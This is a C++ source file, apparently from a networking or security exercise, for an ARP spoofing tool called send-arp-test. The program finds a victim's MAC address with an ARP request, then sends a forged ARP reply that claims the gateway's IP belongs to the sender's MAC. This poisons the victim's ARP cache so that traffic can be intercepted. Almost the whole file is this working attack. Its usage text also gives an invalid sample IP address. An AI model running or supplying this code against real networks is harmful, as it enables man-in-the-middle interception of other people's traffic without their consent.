#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <victim-ip> <gw ip>\n");
	printf("sample: send-arp-test wlan0 192.168.1.24 41.512.42.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	
	char* dev = argv[1]; // ethernet
	char* victim_ip = argv[2];
	char* gw_ip = argv[3];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 0, 0, errbuf); //add bufsize
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	// get my mac & ip address
	struct ifreq s;
	char my_mac[20];
	char my_ip[20];
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	strcpy(s.ifr_name, dev);
	if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
		int i;
		sprintf(my_mac, "%02X:%02X:%02X:%02X:%02X:%02X", (unsigned char)s.ifr_addr.sa_data[0],(unsigned char)s.ifr_addr.sa_data[1],(unsigned char)s.ifr_addr.sa_data[2],(unsigned char)s.ifr_addr.sa_data[3],(unsigned char)s.ifr_addr.sa_data[4],(unsigned char)s.ifr_addr.sa_data[5]);
		printf("%s\n", my_mac);
		printf("%s\n", victim_ip);
 
    		fd = socket(AF_INET, SOCK_DGRAM, 0);
    		s.ifr_addr.sa_family = AF_INET;
    		strncpy(s.ifr_name , dev , IFNAMSIZ - 1);
    		ioctl(fd, SIOCGIFADDR, &s);
    		sprintf(my_ip,"%s",inet_ntoa(( (struct sockaddr_in *)&s.ifr_addr )->sin_addr));
    		printf("%s\n",my_ip);
	}
	EthArpPacket packet;
	
	// first. ask sender mac with sender ip using arp request
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // target mac ff -> get mac address
	packet.eth_.smac_ = Mac(my_mac); // my kali mac addr
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request); // Request -> Reply
	packet.arp_.smac_ = Mac(my_mac); //sender(me) kali mac addr
	
	packet.arp_.sip_ = htonl(Ip(my_ip)); // gw ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //target mac  00 -> get mac
	packet.arp_.tip_ = htonl(Ip(victim_ip)); //target ip
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
	
	// receive packet: sender mac address
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); //add bufsize
	if (pcap == NULL) {
                fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
                return -1;
        }
        
	while (true) {
      		struct pcap_pkthdr* header;
      		const u_char* packet;
      		res = pcap_next_ex(pcap, &header, &packet);
      		if (res == 0) continue;
      		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
         		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
         		break;
      		}
      		// printf("\n\n\n%u bytes captured\n", header->caplen);
      
   		struct EthHdr *eth_h;
        	struct ArpHdr *arp_h;

        	eth_h = (struct EthHdr *)packet;
    		int eth_len = sizeof(struct EthHdr);
        	arp_h = (struct ArpHdr *)(packet+eth_len);
      		uint16_t eth_type = eth_h -> type_; //0806  
      		uint16_t op_type = arp_h -> op();
      		// printf("%04x\n", ntohs(eth_type));
        	// printf("%04x\n", ntohs(op_type));
        	
            	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 0, 0, errbuf);
            	
        	if( ntohs(eth_type) == 0x0806 && ntohs(op_type) == 0x0200 ){
            		// printf("get in\n");
			EthArpPacket packet;
			
			// first. ask sender mac with sender ip using arp request
			packet.eth_.dmac_ = arp_h->smac(); // target mac 
			packet.eth_.smac_ = Mac(my_mac); // my kali mac addr
			packet.eth_.type_ = htons(EthHdr::Arp);

			packet.arp_.hrd_ = htons(ArpHdr::ETHER);
			packet.arp_.pro_ = htons(EthHdr::Ip4);
			packet.arp_.hln_ = Mac::SIZE;
			packet.arp_.pln_ = Ip::SIZE;
			packet.arp_.op_ = htons(ArpHdr::Reply); // Reply
			packet.arp_.smac_ = Mac(my_mac); //sender(me) kali mac addr
	
			packet.arp_.sip_ = htonl(Ip(gw_ip)); // gw ip
			packet.arp_.tmac_ = arp_h->smac(); //target mac  
			packet.arp_.tip_ = htonl(Ip(victim_ip)); //target ip
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			
            		
        	}
   	}
	pcap_close(pcap);
	pcap_close(handle);
	
}
